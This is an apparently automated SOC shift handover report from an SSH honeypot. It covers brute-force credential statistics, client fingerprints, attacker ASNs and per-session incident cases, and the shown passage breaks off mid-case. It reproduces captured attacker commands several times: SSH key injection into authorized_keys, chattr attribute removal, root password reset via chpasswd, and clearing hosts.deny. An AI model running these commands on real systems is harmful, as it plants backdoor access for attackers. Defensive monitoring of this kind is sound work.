# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-22 |
| **Generated At** | 2026-04-22T09:26:14Z |
| **Shift Time** | 09:26 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **299** |
| Confirmed Threats | **179** |
| False Positives Filtered | **120** (40.1%) |
| Unique Attacker IPs | **28** |
| Countries of Origin | **13** |
| High Severity Cases | **67** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **232** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **162** |
| Unique Credential Pairs | **91** |
| Unique Usernames | **40** |
| Unique Passwords | **85** |
| Successful Auth Pairs | **42** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 67 |
| `345gs5662d34` | 33 |
| `ubuntu` | 8 |
| `GET / HTTP/1.1` | 4 |
| `frappe` | 3 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 33 |
| `3245gs5662d34` | 32 |
| `123` | 4 |
| `Host: 13.235.92.17:23` | 4 |
| `admin1234` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 33 |
| `root` | `3245gs5662d34` | 32 |
| `GET / HTTP/1.1` | `Host: 13.235.92.17:23` | 4 |
| `admin1234` | `admin1234` | 2 |
| `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36` | `Accept-Encoding: gzip` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Qazwsx2021@123` | `92.30.241.93` | 2026-04-22T06:06:15 |
| `root` | `3245gs5662d34` | `92.30.241.93` | 2026-04-22T06:06:19 |
| `root` | `ZZdd123` | `92.30.241.93` | 2026-04-22T06:09:48 |
| `root` | `Qazwsx1234567#$` | `92.30.241.93` | 2026-04-22T06:15:42 |
| `root` | `xxQQ123123` | `74.243.239.219` | 2026-04-22T06:15:50 |
| `root` | `3245gs5662d34` | `74.243.239.219` | 2026-04-22T06:15:53 |
| `root` | `ali123` | `92.30.241.93` | 2026-04-22T06:17:27 |
| `root` | `ZAQ!2wsx2018#` | `92.30.241.93` | 2026-04-22T06:20:05 |
| `root` | `qazwsx1234@` | `92.30.241.93` | 2026-04-22T06:21:45 |
| `root` | `ZAQ!2wsx2025!@` | `92.30.241.93` | 2026-04-22T06:23:30 |
| `root` | `Sss123456` | `92.30.241.93` | 2026-04-22T06:26:03 |
| `root` | `Qwe123#` | `101.126.135.154` | 2026-04-22T06:38:17 |
| `root` | `3245gs5662d34` | `101.126.135.154` | 2026-04-22T06:38:22 |
| `root` | `root000@` | `101.126.135.154` | 2026-04-22T06:39:18 |
| `root` | `qazwsx001!` | `179.62.216.38` | 2026-04-22T06:47:50 |
| `root` | `3245gs5662d34` | `179.62.216.38` | 2026-04-22T06:47:59 |
| `root` | `Qwer1234!@#$` | `179.62.216.38` | 2026-04-22T06:52:13 |
| `root` | `zaq12wsx..` | `179.62.216.38` | 2026-04-22T07:09:45 |
| `root` | `AAqq112233` | `179.62.216.38` | 2026-04-22T07:22:54 |
| `root` | `Admin123456!!` | `179.62.216.38` | 2026-04-22T07:31:39 |
| `root` | `server1` | `179.62.216.38` | 2026-04-22T07:40:31 |
| `root` | `QWE!` | `179.62.216.38` | 2026-04-22T07:44:54 |
| `root` | `2023@` | `179.62.216.38` | 2026-04-22T07:52:56 |
| `root` | `123123a@` | `179.62.216.38` | 2026-04-22T08:05:27 |
| `root` | `Asd12345@` | `171.83.22.91` | 2026-04-22T08:42:31 |
| `root` | `3245gs5662d34` | `171.83.22.91` | 2026-04-22T08:42:51 |
| `root` | `Love1314` | `81.192.46.45` | 2026-04-22T08:49:00 |
| `root` | `3245gs5662d34` | `81.192.46.45` | 2026-04-22T08:49:04 |
| `root` | `zR30SwkmuW` | `218.90.235.58` | 2026-04-22T08:49:50 |
| `root` | `JaM6dPYlXH` | `218.90.235.58` | 2026-04-22T08:50:21 |
| `root` | `qazwsx112233!` | `81.192.46.45` | 2026-04-22T08:53:50 |
| `root` | `Config123` | `81.192.46.45` | 2026-04-22T08:58:38 |
| `root` | `Abc@123.` | `81.192.46.45` | 2026-04-22T09:01:02 |
| `root` | `1qazxsw2` | `81.192.46.45` | 2026-04-22T09:08:14 |
| `root` | `CCqq000` | `81.192.46.45` | 2026-04-22T09:10:37 |
| `root` | `Qazwsx01$` | `207.180.238.248` | 2026-04-22T09:12:36 |
| `root` | `3245gs5662d34` | `207.180.238.248` | 2026-04-22T09:12:40 |
| `root` | `qaz123123` | `81.192.46.45` | 2026-04-22T09:13:01 |
| `root` | `ali123456` | `81.192.46.45` | 2026-04-22T09:15:25 |
| `root` | `AA123456789BB` | `81.192.46.45` | 2026-04-22T09:17:49 |
| `root` | `1qaz@WSX3edc$RFV!@` | `81.192.46.45` | 2026-04-22T09:20:27 |
| `root` | `qazwsx54321$` | `81.192.46.45` | 2026-04-22T09:22:49 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **299** |
| Sessions with Fingerprint | **7** |
| Unique HASSH Fingerprints | **7** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 190 |
| Unknown | 3 |
| Paramiko (Python) | 1 |
| Go SSH scanner | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `af8223ac9914...` | libssh-based | 157 | 8 |
| `03a80b21afa8...` | Modern SSH client | 32 | 5 |
| `1b8acd46a07d...` | Modern SSH client | 2 | 1 |
| `a704be057881...` | Mirai/variant | 1 | 1 |
| `19532158b559...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `af8223ac9914...` | libssh | 157 | 8 | libssh-based |
| `03a80b21afa8...` | libssh | 32 | 5 | Modern SSH client |
| `1b8acd46a07d...` | Unknown | 2 | 1 | Modern SSH client |
| `a704be057881...` | Paramiko (Python) | 1 | 1 | Mirai/variant |
| `95420f9d932d...` | Unknown | 1 | 1 | — |
| `19532158b559...` | libssh | 1 | 1 | Mirai/variant |
| `084386fa7ae5...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 32 | 7 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:ja7ePHLB27ML"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `101.126.135.154`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `74.243.239.219`, `81.192.46.45`, `207.180.238.248`, `101.126.135.154`, `92.30.241.93`, `179.62.216.38`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **28** |
| Unique ASNs | **23** |
| High-Risk ASNs | **15** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS8075` | Microsoft Corporation | 3 | HIGH |
| `AS396982` | Google LLC | 2 | LOW |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 2 | HIGH |
| `AS4134` | CHINANET BACKBONE | 2 | HIGH |
| `AS16509` | Amazon.com, Inc. | 1 | HIGH |
| `AS51167` | Contabo GmbH | 1 | HIGH |
| `AS138245` | Xpress Net Solution | 1 | LOW |
| `AS51396` | Pfcloud UG | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (67)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-6afe9464bed5

| Field | Detail |
|---|---|
| **Source IP** | `92.30.241[.]93` |
| **First Seen** | 2026-04-22 06:06 |
| **Last Seen** | 2026-04-22 06:06 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 06:06:14` | `cowrie.session.connect` |
| `2026-04-22 06:06:14` | `cowrie.client.version` |
| `2026-04-22 06:06:15` | `cowrie.client.kex` |
| `2026-04-22 06:06:15` | `cowrie.login.success` |
| `2026-04-22 06:06:16` | `cowrie.session.params` |
| `2026-04-22 06:06:16` | `cowrie.command.input` |
| `2026-04-22 06:06:16` | `cowrie.command.failed` |
| `2026-04-22 06:06:16` | `cowrie.log.closed` |
| `2026-04-22 06:06:16` | `cowrie.session.params` |
| `2026-04-22 06:06:16` | `cowrie.command.input` |
| `2026-04-22 06:06:16` | `cowrie.session.file_download` |
| `2026-04-22 06:06:16` | `cowrie.log.closed` |
| `2026-04-22 06:06:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.30.241[.]93` to AbuseIPDB if not already reported
- [ ] Block `92.30.241[.]93` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-705c2e30475d

| Field | Detail |
|---|---|
| **Source IP** | `92.30.241[.]93` |
| **First Seen** | 2026-04-22 06:06 |
| **Last Seen** | 2026-04-22 06:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 06:06:19` | `cowrie.session.connect` |
| `2026-04-22 06:06:19` | `cowrie.client.version` |
| `2026-04-22 06:06:19` | `cowrie.client.kex` |
| `2026-04-22 06:06:19` | `cowrie.login.success` |
| `2026-04-22 06:06:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.30.241[.]93` to AbuseIPDB if not already reported
- [ ] Block `92.30.241[.]93` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cafa4f645d72

| Field | Detail |
|---|---|
| **Source IP** | `92.30.241[.]93` |
| **First Seen** | 2026-04-22 06:09 |
| **Last Seen** | 2026-04-22 06:09 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 06:09:47` | `cowrie.session.connect` |
| `2026-04-22 06:09:47` | `cowrie.client.version` |
| `2026-04-22 06:09:47` | `cowrie.client.kex` |
| `2026-04-22 06:09:48` | `cowrie.login.success` |
| `2026-04-22 06:09:48` | `cowrie.session.params` |
| `2026-04-22 06:09:48` | `cowrie.command.input` |
| `2026-04-22 06:09:48` | `cowrie.command.failed` |
| `2026-04-22 06:09:48` | `cowrie.log.closed` |
| `2026-04-22 06:09:48` | `cowrie.session.params` |
| `2026-04-22 06:09:48` | `cowrie.command.input` |
| `2026-04-22 06:09:49` | `cowrie.session.file_download` |
| `2026-04-22 06:09:49` | `cowrie.log.closed` |
| `2026-04-22 06:09:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.30.241[.]93` to AbuseIPDB if not already reported
- [ ] Block `92.30.241[.]93` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6aeccd07655a

| Field | Detail |
|---|---|
| **Source IP** | `92.30.241[.]93` |
| **First Seen** | 2026-04-22 06:09 |
| **Last Seen** | 2026-04-22 06:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 06:09:51` | `cowrie.session.connect` |
| `2026-04-22 06:09:51` | `cowrie.client.version` |
| `2026-04-22 06:09:51` | `cowrie.client.kex` |
| `2026-04-22 06:09:52` | `cowrie.login.success` |
| `2026-04-22 06:09:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.30.241[.]93` to AbuseIPDB if not already reported
- [ ] Block `92.30.241[.]93` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-01c759e51ded

| Field | Detail |
|---|---|
| **Source IP** | `92.30.241[.]93` |
| **First Seen** | 2026-04-22 06:15 |
| **Last Seen** | 2026-04-22 06:15 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 06:15:41` | `cowrie.session.connect` |
| `2026-04-22 06:15:41` | `cowrie.client.version` |
| `2026-04-22 06:15:41` | `cowrie.client.kex` |
| `2026-04-22 06:15:42` | `cowrie.login.success` |
| `2026-04-22 06:15:42` | `cowrie.session.params` |
| `2026-04-22 06:15:42` | `cowrie.command.input` |
| `2026-04-22 06:15:42` | `cowrie.command.failed` |
| `2026-04-22 06:15:43` | `cowrie.log.closed` |
| `2026-04-22 06:15:43` | `cowrie.session.params` |
| `2026-04-22 06:15:43` | `cowrie.command.input` |
| `2026-04-22 06:15:43` | `cowrie.session.file_download` |
| `2026-04-22 06:15:43` | `cowrie.log.closed` |
| `2026-04-22 06:15:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.30.241[.]93` to AbuseIPDB if not already reported
- [ ] Block `92.30.241[.]93` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7d68b58c61a

| Field | Detail |
|---|---|
| **Source IP** | `92.30.241[.]93` |
| **First Seen** | 2026-04-22 06:15 |
| **Last Seen** | 2026-04-22 06:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 06:15:45` | `cowrie.session.connect` |
| `2026-04-22 06:15:45` | `cowrie.client.version` |
| `2026-04-22 06:15:46` | `cowrie.client.kex` |
| `2026-04-22 06:15:46` | `cowrie.login.success` |
| `2026-04-22 06:15:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.30.241[.]93` to AbuseIPDB if not already reported
- [ ] Block `92.30.241[.]93` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e80b949ab77c

| Field | Detail |
|---|---|
| **Source IP** | `74.243.239[.]219` |
| **First Seen** | 2026-04-22 06:15 |
| **Last Seen** | 2026-04-22 06:15 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 06:15:50` | `cowrie.session.connect` |
| `2026-04-22 06:15:50` | `cowrie.client.version` |
| `2026-04-22 06:15:50` | `cowrie.client.kex` |
| `2026-04-22 06:15:50` | `cowrie.login.success` |
| `2026-04-22 06:15:50` | `cowrie.session.params` |
| `2026-04-22 06:15:50` | `cowrie.command.input` |
| `2026-04-22 06:15:50` | `cowrie.command.failed` |
| `2026-04-22 06:15:50` | `cowrie.log.closed` |
| `2026-04-22 06:15:51` | `cowrie.session.params` |
| `2026-04-22 06:15:51` | `cowrie.command.input` |
| `2026-04-22 06:15:51` | `cowrie.session.file_download` |
| `2026-04-22 06:15:51` | `cowrie.log.closed` |
| `2026-04-22 06:15:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `74.243.239[.]219` to AbuseIPDB if not already reported
- [ ] Block `74.243.239[.]219` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-90437b929469

| Field | Detail |
|---|---|
| **Source IP** | `74.243.239[.]219` |
| **First Seen** | 2026-04-22 06:15 |
| **Last Seen** | 2026-04-22 06:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 06:15:52` | `cowrie.session.connect` |
| `2026-04-22 06:15:52` | `cowrie.client.version` |
| `2026-04-22 06:15:52` | `cowrie.client.kex` |
| `2026-04-22 06:15:53` | `cowrie.login.success` |
| `2026-04-22 06:15:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `74.243.239[.]219` to AbuseIPDB if not already reported
- [ ] Block `74.243.239[.]219` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5caa514a131e

| Field | Detail |
|---|---|
| **Source IP** | `92.30.241[.]93` |
| **First Seen** | 2026-04-22 06:17 |
| **Last Seen** | 2026-04-22 06:17 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 06:17:26` | `cowrie.session.connect` |
| `2026-04-22 06:17:26` | `cowrie.client.version` |
| `2026-04-22 06:17:26` | `cowrie.client.kex` |
| `2026-04-22 06:17:27` | `cowrie.login.success` |
| `2026-04-22 06:17:27` | `cowrie.session.params` |
| `2026-04-22 06:17:27` | `cowrie.command.input` |
| `2026-04-22 06:17:27` | `cowrie.command.failed` |
| `2026-04-22 06:17:27` | `cowrie.log.closed` |
| `2026-04-22 06:17:28` | `cowrie.session.params` |
| `2026-04-22 06:17:28` | `cowrie.command.input` |
| `2026-04-22 06:17:28` | `cowrie.session.file_download` |
| `2026-04-22 06:17:28` | `cowrie.log.closed` |
| `2026-04-22 06:17:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.30.241[.]93` to AbuseIPDB if not already reported
- [ ] Block `92.30.241[.]93` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af89c422292e

| Field | Detail |
|---|---|
| **Source IP** | `92.30.241[.]93` |
| **First Seen** | 2026-04-22 06:17 |
| **Last Seen** | 2026-04-22 06:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 06:17:30` | `cowrie.session.connect` |
| `2026-04-22 06:17:30` | `cowrie.client.version` |
| `2026-04-22 06:17:30` | `cowrie.client.kex` |
| `2026-04-22 06:17:31` | `cowrie.login.success` |
| `2026-04-22 06:17:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.30.241[.]93` to AbuseIPDB if not already reported
- [ ] Block `92.30.241[.]93` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-20cc1706bc2a

| Field | Detail |
|---|---|
| **Source IP** | `92.30.241[.]93` |
| **First Seen** | 2026-04-22 06:20 |
| **Last Seen** | 2026-04-22 06:20 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
